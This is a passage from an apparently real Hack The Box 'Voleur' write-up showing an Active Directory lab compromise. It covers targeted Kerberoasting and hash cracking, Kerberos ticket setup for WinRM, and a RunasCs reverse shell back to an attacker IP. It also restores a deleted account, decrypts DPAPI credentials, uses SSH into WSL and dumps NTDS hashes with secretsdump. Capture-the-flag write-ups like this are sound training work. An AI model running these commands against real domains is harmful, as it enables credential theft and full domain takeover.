┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ python3 ~/Tools/targetedKerberoast/targetedKerberoast.py -d voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' --request-user svc_winrm --dc-ip 10.129.24.74 -o hash.txt          ──(Mon,Jun29)─┘
[*] Starting kerberoast attacks
[!] automatic bind not successful - invalidCredentials
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ python3 ~/Tools/targetedKerberoast/targetedKerberoast.py -d voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k --request-user svc_winrm --dc-ip 10.129.24.74 -o hash.txt       ──(Mon,Jun29)─┘
[*] Starting kerberoast attacks
[!] Error while anonymous logging into voleur.htb
```


So I requested one for **svc_ldap**.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ getTGT.py voleur.htb/svc_ldap:'M1XyC9pW7qT5Vn' -dc-ip 10.129.24.74 -k                                                                                                     ──(Mon,Jun29)─┘
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in svc_ldap.ccache
```


```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ export KRB5CCNAME=svc_ldap.ccache                                                                                                                                         ──(Mon,Jun29)─┘
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ klist                                                                                                                                                                     ──(Mon,Jun29)─┘
Ticket cache: FILE:svc_ldap.ccache
Default principal: svc_ldap@VOLEUR.HTB

Valid starting       Expires              Service principal
06/29/2026 22:40:33  06/30/2026 08:40:33  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 06/30/2026 22:40:33
```

After exporting the credential cache and verifying it with `klist`, I tried again.

This time everything worked.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ python3 ~/Tools/targetedKerberoast/targetedKerberoast.py -k --dc-host dc.voleur.htb -d voleur.htb -u svc_ldap -o TKhashes.txt                                             ──(Mon,Jun29)─┘
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Writing hash to file for (lacey.miller)
[+] Writing hash to file for (svc_winrm)
```

Success.

The tool returned Kerberos service tickets for:

- `lacey.miller`
- `svc_winrm`


### Cracking the Ticket

With the Kerberos TGS hashes saved to a file I ran hashcat.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ hashcat -m 13100 TKhashes.txt /usr/share/wordlists/rockyou.txt                                                                                                            ──(Mon,Jun29)─┘
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-8700K CPU @ 3.70GHz, 6734/13532 MB (2048 MB allocatable), 2MCU

<SNIP>

$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$a474092cae6d54f5e67c1c989ab4a162$97877922a929688d4f92962934c86c6e0b75bcc5789e7f1368275e24ecab2d0d9b75bd97ac740dffa245345d65dc5aa5b164663af9f5cac95b697da3f5b6a76583f104c5717fcc26beb8b1e
<SNIP>
e45f4afb90e63435c6f62295e1e804b54de443336d50cb363afcd1792daf7cf0f650fd622bab9bc78c121205edbf598:AFireInsidedeOzarctica980219afi
Approaching final keyspace - workload adjusted.


Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: TKhashes.txt
Time.Started.....: Mon Jun 29 22:50:59 2026 (23 secs)
Time.Estimated...: Mon Jun 29 22:51:22 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1091.3 kH/s (1.52ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new), 1/2 (50.00%) Salts
Progress.........: 28688770/28688770 (100.00%)
Rejected.........: 0/28688770 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 91%

Started: Mon Jun 29 22:50:58 2026
Stopped: Mon Jun 29 22:51:23 2026

```


I recovered one password!

`svc_winrm:AFireInsidedeOzarctica980219afi`

I should now be able to use `Evil-winrm` and get a shell but first I'm going to do a quick check.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ nxc winrm dc.voleur.htb -u svc_winrm -p AFireInsidedeOzarctica980219afi -k                                                                                                ──(Mon,Jun29)─┘
[22:57:25] ERROR    Invalid NTLM challenge received from server. This may indicate NTLM is not supported and nxc winrm only support NTLM currently                                 winrm.py:66
WINRM       dc.voleur.htb   5985   dc.voleur.htb    [*] None (name:dc.voleur.htb) (domain:None) (NTLM:False)
```


It failed again because of a Kerberose issue. Kind of annoying having to make a TGT every time. I was pretty sure these credentials are correct so I just tried them.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ evil-winrm -i dc.voleur.htb -u 'svc_winrm' -p 'AFireInsidedeOzarctica980219afi'                                                                                       1 ↵ ──(Mon,Jun29)─┘

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type ArgumentError happened, message is unknown type: 2061232681

Error: Exiting with code 1
```

Fails. 

It looks like I'm going to have to create a ticket after all.

I generated a fresh Ticket Granting Ticket for **svc_winrm**:
```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ getTGT.py voleur.htb/svc_winrm:'AFireInsidedeOzarctica980219afi' -dc-ip 10.129.24.74 -k                                                                                   ──(Mon,Jun29)─┘
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in svc_winrm.ccache
```


Exported the ticket:
```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ export KRB5CCNAME=svc_winrm.ccache                                                                                                                                        ──(Mon,Jun29)─┘
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ klist                                                                                                                                                                     ──(Mon,Jun29)─┘
Ticket cache: FILE:svc_winrm.ccache
Default principal: svc_winrm@VOLEUR.HTB

Valid starting       Expires              Service principal
06/29/2026 23:03:01  06/30/2026 09:03:01  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 06/30/2026 23:03:01
```

Verified it with `klist` and Evil-WinRM still refuses to cooperate. I still can't authenticate with the `svc_winrm` user. After some digging, I discovered the difference between the two tools.

Impacket's `getTGT.py` communicates directly with the Key Distribution Center that you specify (or resolve from the target) and **doesn't rely on your system's Kerberos configuration** in the same way that GSSAPI-based tools do.

Evil-WinRM, on the other hand, uses the system Kerberos libraries, which consult `/etc/krb5.conf` (or DNS SRV records) to locate the KDC. My default `krb5.conf` was still pointing to a different example realm.

After updating the configuration to point to the **VOLEUR.HTB** realm and `dc.voleur.htb` as the KDC, everything finally worked.

Fix
```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ cat /etc/krb5.conf                                                                                                                                                        ──(Mon,Jun29)─┘
[libdefaults]
        default_realm = ATHENA.MIT.EDU

# The following krb5.conf variables are only for MIT Kerberos.
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
        rdns = false


# The following libdefaults parameters are only for Heimdal Kerberos.
        fcc-mit-ticketflags = true

[realms]
        VOLEUR.HTB = {
        kdc = dc.voleur.htb
    }

[domain_realm]
     .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
```


After a few detours, several Kerberos lessons, and more than one self-inflicted mistake, I have an initial shell.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ evil-winrm -i dc.voleur.htb -k svc_winrm.ccache -r voleur.htb                                                                                                             ──(Mon,Jun29)─┘

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: Useless cert/s provided, SSL is not enabled

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> whoami
voleur\svc_winrm
```

Grabbed the user.txt flag in Desktop.

## 🛡️ Privilege Escalation

### Revisiting Todd.Wolfe

I now have a shell as **`svc_winrm`**.  

I next turn my attention to the password-protected spreadsheet from earlier. Specifically the comment next to the **`Todd.Wolfe`** account.

**"Leaver. Password was reset to NightT1meP1dg3on14 and account deleted."**

If I can restore the account, I already know its password. Earlier, BloodHound showed that **`svc_ldap`** is a member of the `Restore Users` group. If I can switch back to that account, I might have enough privileges to bring `Todd.Wolfe` back.

Before I do that, I decide to collect another set of BloodHound data using my current shell. I upload SharpHound.exe through Evil-WinRM and run another collection.

Unfortunately, `Todd.Wolfe` still doesn't appear in the BloodHound data. Since the account is deleted, that isn't too surprising.

At this point, it's clear that I need to switch back to **`svc_ldap`**.

### Confirming My Permissions

Before making any changes, I want to confirm exactly what permissions **`svc_ldap`** has within the domain.

I use **bloodyAD** to enumerate every object that the account can modify.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ bloodyAD --host dc.voleur.htb -d voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=voleur,DC=htb
permission: WRITE

distinguishedName: OU=Second-Line Support Technicians,DC=voleur,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: CN=Lacey Miller,OU=Second-Line Support Technicians,DC=voleur,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: CN=svc_ldap,OU=Service Accounts,DC=voleur,DC=htb
permission: WRITE

distinguishedName: CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: CN=svc_winrm,OU=Service Accounts,DC=voleur,DC=htb
permission: WRITE

distinguishedName: DC=voleur.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=voleur,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.voleur.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=voleur,DC=htb
permission: CREATE_CHILD
```

The output contains several writable objects.

**permission: CREATE_CHILD; WRITE**

Not only can `svc_ldap` modify the deleted object, but it also has the permissions required to restore it. Even better, the output provides the deleted object's GUID, which I'll need in just a moment.


### Switching Back to svc_ldap

I already know the password for **`svc_ldap`**, so I use **RunasCs.exe** to spawn a PowerShell process as that user and send it back to my listener.

```shell
*Evil-WinRM* PS C:\programdata> upload RunasCs.exe

Info: Uploading /home/split/Documents/HTB/Voleur/RunasCs.exe to C:\programdata\RunasCs.exe

Data: 70996 bytes of 70996 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\programdata> ./RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.14.182:9001
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-678b79$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 2304 created in background.
```


After catching the reverse shell, I verify that everything worked.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ nc -nvlp 9001                                                             ──(Mon,Jun29)─┘
Listening on 0.0.0.0 9001
Connection received on 10.129.24.74 61536
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
voleur\svc_ldap
```


Now to restore `Todd.Wolfe`.

### Restoring the Deleted Account

Since **bloodyAD** already gave me the deleted object's GUID, restoring the account is straightforward.

```powershell
PS C:\Windows\system32> Restore-ADObject -Identity '1c6b1deb-c372-4cbb-87b1-15031de169db'
Restore-ADObject -Identity '1c6b1deb-c372-4cbb-87b1-15031de169db'
```


The command completes successfully.

To verify the restore, I list the local domain users.

```powershell
PS C:\Windows\system32> net users
net users

User accounts for \\DC

-------------------------------------------------------------------------------
Administrator            krbtgt                   svc_ldap
todd.wolfe
The command completed successfully.
```

Sure enough, **Todd.Wolfe** is back.


The excel file I got earlier specifies Todd.Wolfe's password is `NightT1meP1dg3on14`.

The credentials still work!
```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ nxc smb dc.voleur.htb -u todd.wolfe -p 'NightT1meP1dg3on14' -k             ──(Tue,Jun30)─┘
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\todd.wolfe:NightT1meP1dg3on14
```


### BloodHound Revisited

Now that Todd.Wolfe exists again, I generate another BloodHound collection using my **`svc_ldap`** shell. This time, Todd appears in the graph.

Looking at the account's group memberships, I notice that `Todd.Wolfe` is a member of the `Remote Management Users` group, which means I should be able to obtain a WinRM shell using his credentials.

Rather than overcomplicating things, I simply reuse RunasCs.exe to launch another PowerShell process as `Todd.Wolfe`. Within a few seconds, I have another shell.

With a shell as `Todd.Wolfe`, it's time to start enumerating again and see what additional access this account provides.

### 🔐DPAPI & Jeremy Combs

At this point, I'm not entirely sure where to go next, so I fall back to one of the most reliable techniques in any engagement: **enumeration**.

Since I've restored the `todd.wolfe` account, I want to see if it has access to any SMB shares that my previous accounts couldn't reach. I connect to the Domain Controller using Impacket's `smbclient.py` and authenticate with Kerberos, which tends to be more reliable in environments where NTLM is disabled.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ smbclient.py -k voleur.htb/todd.wolfe:'NightT1meP1dg3on14'@dc.voleur.htb                                                                                                  ──(Tue,Jun30)─┘
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands

# help

 open {host,port=445} - opens a SMB connection against the target host/port
 reconnect - reconnect connection, useful for broken pipes & interrupted sessions
 login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
 kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
 login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes
 logoff - logs off
 shares - list available shares
 use {sharename} - connect to an specific share
 cd {path} - changes the current directory to {path}
 lcd {path} - changes the current local directory to {path}
 pwd - shows current remote directory
 password - changes the user password, the new password will be prompted for input
 ls {wildcard} - lists all the files in the current directory
 lls {dirname} - lists all the files on the local filesystem.
 tree {filepath} - recursively lists all files in folder and sub folders
 rm {file} - removes the selected file
 mkdir {dirname} - creates the directory under the current path
 rmdir {dirname} - removes the directory under the current path
 put {filename} - uploads the filename into the current path
 get {filename} - downloads the filename from the current path
 mget {mask} - downloads all files from the current directory matching the provided mask
 cat {filename} - reads the filename from the current path
 mount {target,path} - creates a mount point from {path} to {target} (admin required)
 umount {path} - removes the mount point at {path} without deleting the directory (admin required)
 list_snapshots {path} - lists the vss snapshots for the specified path
 info - returns NetrServerInfo main results
 who - returns the sessions currently connected at the target host (admin required)
 close - closes the current SMB Session
 exit - terminates the server process (and this session)


# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 03:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 15:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 09:13:03 2025 Second-Line Support
# cd Second-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 09:13:03 2025 .
drw-rw-rw-          0  Wed Jan 29 03:10:01 2025 ..
drw-rw-rw-          0  Wed Jan 29 09:13:06 2025 Archived Users
# cd Archived Users
# ls
drw-rw-rw-          0  Wed Jan 29 09:13:06 2025 .
drw-rw-rw-          0  Wed Jan 29 09:13:03 2025 ..
drw-rw-rw-          0  Wed Jan 29 09:13:16 2025 todd.wolfe
# ls -la
[-] SMB SessionError: code: 0xc000000f - STATUS_NO_SUCH_FILE - {File Not Found} The file %hs does not exist.
# cd todd.wolfe
# ls
drw-rw-rw-          0  Wed Jan 29 09:13:16 2025 .
drw-rw-rw-          0  Wed Jan 29 09:13:06 2025 ..
drw-rw-rw-          0  Wed Jan 29 09:13:06 2025 3D Objects
drw-rw-rw-          0  Wed Jan 29 09:13:09 2025 AppData
drw-rw-rw-          0  Wed Jan 29 09:13:10 2025 Contacts
drw-rw-rw-          0  Thu Jan 30 08:28:50 2025 Desktop
drw-rw-rw-          0  Wed Jan 29 09:13:10 2025 Documents
drw-rw-rw-          0  Wed Jan 29 09:13:10 2025 Downloads
drw-rw-rw-          0  Wed Jan 29 09:13:10 2025 Favorites
drw-rw-rw-          0  Wed Jan 29 09:13:10 2025 Links
drw-rw-rw-          0  Wed Jan 29 09:13:10 2025 Music
-rw-rw-rw-      65536  Wed Jan 29 09:13:06 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-rw-rw-rw-     524288  Wed Jan 29 06:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-rw-     524288  Wed Jan 29 06:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-rw-         20  Wed Jan 29 06:53:07 2025 ntuser.ini
drw-rw-rw-          0  Wed Jan 29 09:13:10 2025 Pictures
drw-rw-rw-          0  Wed Jan 29 09:13:10 2025 Saved Games
drw-rw-rw-          0  Wed Jan 29 09:13:10 2025 Searches
drw-rw-rw-          0  Wed Jan 29 09:13:10 2025 Videos
```

It's been a while since I've used `smbclient.py`, so I quickly check the built-in `help` menu to refresh my memory on the available commands.

After browsing the available shares, I quickly realize that `todd.wolfe` only has access to the **IT** share. I start working my way through the directory structure until I eventually find something much more interesting.

Inside Todd's archived profile, I notice two directories that immediately catch my attention:
```shell
AppData\Roaming\Microsoft\Credentials
AppData\Roaming\Microsoft\Protect
```

These are classic **DPAPI** artifacts.

### Understanding DPAPI


Windows uses the **Data Protection API (DPAPI)** to securely store sensitive information such as saved credentials, browser passwords, wireless keys, and other secrets.

Rather than storing these secrets in plaintext, Windows encrypts them using a **Master Key** that is tied to the user's logon credentials.

The process looks like this:
1. The user's password is used to decrypt the DPAPI Master Key.
2. The Master Key is then used to decrypt any protected credential blobs.
3. Once decrypted, the original secret is revealed.

Since I already know Todd.Wolfe's password from the spreadsheet I found earlier, I should have everything I need to recover any stored credentials.

First, I download the encrypted credential blob.

```shell
# pwd
/Second-Line Support/Archived Users/todd.wolfe/Appdata/roaming/microsoft/credentials
# get 772275FAD58525253490A9B0039791D3
```


Next, I navigate to the user's **Protect** directory and download the corresponding Master Key.

```shell
# pwd
/Second-Line Support/Archived Users/todd.wolfe/Appdata/roaming/microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110
# ls
drw-rw-rw-          0  Wed Jan 29 09:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 09:13:09 2025 ..
-rw-rw-rw-        740  Wed Jan 29 07:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-        900  Wed Jan 29 06:53:08 2025 BK-VOLEUR
-rw-rw-rw-         24  Wed Jan 29 06:53:08 2025 Preferred
# get 08949382-134f-4c63-b93c-ce52efc0aa88
```


With both files in hand, I use Impacket's `dpapi.py` to decrypt the Master Key using Todd's SID and password.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur/dpapi]
└─❯ dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

The Master Key decrypts successfully and returns the raw decryption key.

Now I can use that key to decrypt the credential blob itself.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur/dpapi]
└─❯ dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description :
Unknown     :
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

Success.

The decrypted credential reveals another set of domain credentials.


### Logging in as Jeremy

The first thing I do is request a Kerberos Ticket Granting Ticket for `jeremy.combs`.

```shell
getTGT.py voleur.htb/jeremy.combs:'qT3V9pLXyN7W4m'
```


After exporting the credential cache, I verify that everything looks good.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ export KRB5CCNAME=jeremy.combs.ccache                                      ──(Tue,Jun30)─┘
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ klist                                                                      ──(Tue,Jun30)─┘
Ticket cache: FILE:jeremy.combs.ccache
Default principal: jeremy.combs@VOLEUR.HTB

Valid starting       Expires              Service principal
06/30/2026 00:55:41  06/30/2026 10:55:41  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 07/01/2026 00:55:41
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ evil-winrm -i dc.voleur.htb -k jeremy.combs.ccache -r voleur.htb           ──(Tue,Jun30)─┘

Evil-WinRM shell v3.5
<SNIP>

*Evil-WinRM* PS C:\Users\jeremy.combs\Documents> whoami
voleur\jeremy.combs
```

With a valid Kerberos ticket in hand, I connect using Evil-WinRM. This time the connection succeeds immediately. Time for another round of enumeration.


### Third-Line Support


While exploring the filesystem, I eventually come across another interesting directory. Inside are only a few files.

```shell
*Evil-WinRM* PS C:\IT\Third-Line Support> dir


    Directory: C:\IT\Third-Line Support


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/30/2025   8:11 AM                Backups
-a----         1/30/2025   8:10 AM           2602 id_rsa
-a----         1/30/2025   8:07 AM            186 Note.txt.txt
```

Let's see what the Note says.
```shell
*Evil-WinRM* PS C:\IT\Third-Line Support> type Note.txt.txt
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```


Now I know what port 2222 is probably for. During my initial Nmap scan, I found an SSH service listening on **port 2222** that identified itself as Ubuntu. At the time it seemed completely out of place on a Windows Domain Controller.

Now it makes sense.

The administrators have been experimenting with **Windows Subsystem for Linux (WSL)** to perform backups, and that SSH service is providing access to the Linux environment.

Even better, the same directory contains an **`id_rsa`** private key. The obvious next question is Who does it belong to?

I could do some password spraying but looking back through the domain users, one account immediately stands out **`svc_backup`**. 

I save the key locally, lock down its permissions, and try logging in.


```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ chmod 600 id_rsa                                            


┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ ssh -i id_rsa svc_backup@voleur.htb -p 2222                                                                                                                         255 ↵ ──(Tue,Jun30)─┘
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jun 29 23:10:09 PDT 2026

  System load:    0.52      Processes:             9
  Usage of /home: unknown   Users logged in:       0
  Memory usage:   39%       IPv4 address for eth0: 10.129.24.74
  Swap usage:     0%


363 updates can be installed immediately.
257 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
 * Starting OpenBSD Secure Shell server sshd                                                                                                                                           [ OK ]
svc_backup@DC:~$

```


Success.

Instead of a Windows shell, I'm greeted by an Ubuntu prompt running inside WSL just like the note hinted at.


### 🏁 Root

### Enumerating the WSL Environment


Now that I have a shell as **`svc_backup`**, I start enumerating the Linux environment. Since this is **Windows Subsystem for Linux (WSL)**, I suspect there may be backups or other artifacts stored here that aren't accessible from Windows. To speed things up, I upload and run `linPEAS.sh`.

Bingo

Most of the output is just the usual Linux enumeration, but one section looks interesting.

```shell
╔══════════╣ Analyzing Windows Files (limit 70)

dr-xr-xr-x 1 svc_backup svc_backup 4096 May  8  2021 /mnt/c/Windows/SysWOW64/LogFiles/SAM
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jun 29 16:15 /mnt/c/Windows/System32/LogFiles/SAM
---------- 1 svc_backup svc_backup 0 Jan 28  2025 /mnt/c/Windows/System32/config/RegBack/SAM
---------- 1 svc_backup svc_backup 65536 Jul 24  2025 /mnt/c/Windows/System32/config/SAM

-rwxrwxrwx 1 svc_backup svc_backup 18350080 Jan 30  2025 /mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM
---------- 1 svc_backup svc_backup 0 Jan 28  2025 /mnt/c/Windows/System32/config/RegBack/SYSTEM
---------- 1 svc_backup svc_backup 20709376 Jul 24  2025 /mnt/c/Windows/System32/config/SYSTEM
```

Among the results, I notice a directory that looks very promising.


### Finding the Registry Backups


If these really are registry backups, there's a good chance they contain the files I'm looking for. I start browsing through the mounted Windows filesystem. Everything looks exactly like the C: drive on the Windows host.

```shell
svc_backup@DC:/tmp$ cd /mnt
svc_backup@DC:/mnt$ dir
c
svc_backup@DC:/mnt$ cd c
svc_backup@DC:/mnt/c$ dir
$Recycle.Bin  Config.Msi                DumpStack.log.tmp  HR  PerfLogs        Program\ Files\ (x86)  Recovery                     Users    inetpub
$WinREAgent   Documents\ and\ Settings  Finance            IT  Program\ Files  ProgramData            System\ Volume\ Information  Windows  pagefile.sys
```


Remembering the **Backups** directory I found earlier while logged in as `jeremy.combs`. I couldn't access it then, but now that I'm logged in as **`svc_backup`**, that's no longer a problem. I navigate into the directory. Sure enough here it is.

```shell
svc_backup@DC:/mnt/c/IT/Third-Line Support$ cd Backups
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls
'Active Directory'   registry
```


The **registry** directory contains backup copies of the Windows registry hives, while the **Active Directory** directory contains the domain database. These are exactly the files I need.

If I can download the **SYSTEM**, **SECURITY**, and **NTDS.dit** files, I can extract every password hash in the domain offline using Impacket's `secretsdump.py`. 

### Downloading the Backup Files

There are plenty of ways to transfer files, but since I already have SSH access to the WSL instance, `rsync` is by far the easiest option. I copy the **SYSTEM** hive to my attack machine.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ rsync -avz -e "ssh -i id_rsa -p 2222" svc_backup@voleur.htb:"/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM" ~/Documents/HTB/Voleur/www
receiving incremental file list
SYSTEM

sent 43 bytes  received 3,195,453 bytes  375,940.71 bytes/sec
total size is 18,350,080  speedup is 5.74
```

I'll grab the other two files I need the same way. With all three files downloaded, I have everything I need to dump the domain credentials offline.


### Dumping the Domain Hashes


After a few moments, `secretsdump.py` begins decrypting the database.

Out comes the following information:

- Cached credentials
- LSA secrets
- DPAPI system keys
- Kerberos keys
- Every NTLM hash stored in Active Directory

More importantly the **Administrator** account hash.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur/www]
└─❯ secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL     ──(Tue,Jun30)─┘
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77
[*] DPAPI_SYSTEM
dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
